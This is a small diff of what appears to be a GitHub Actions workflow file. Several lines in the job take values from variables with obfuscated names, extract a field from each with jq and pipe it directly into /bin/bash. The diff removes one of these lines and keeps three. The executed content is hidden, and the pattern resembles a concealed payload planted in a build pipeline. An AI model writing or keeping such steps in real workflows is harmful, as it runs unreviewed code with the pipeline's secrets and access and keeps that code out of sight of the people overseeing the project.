@@ -21,7 +21,6 @@ jobs:
           echo $ihpvp134 | jq -r .s492 | /bin/bash
           echo $yf13876 | jq -r .vvmi211 | /bin/bash
           printf '%s' "$h1566" | jq -r .z02 | /bin/bash
-          echo $rtom501 | jq -r .og8 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
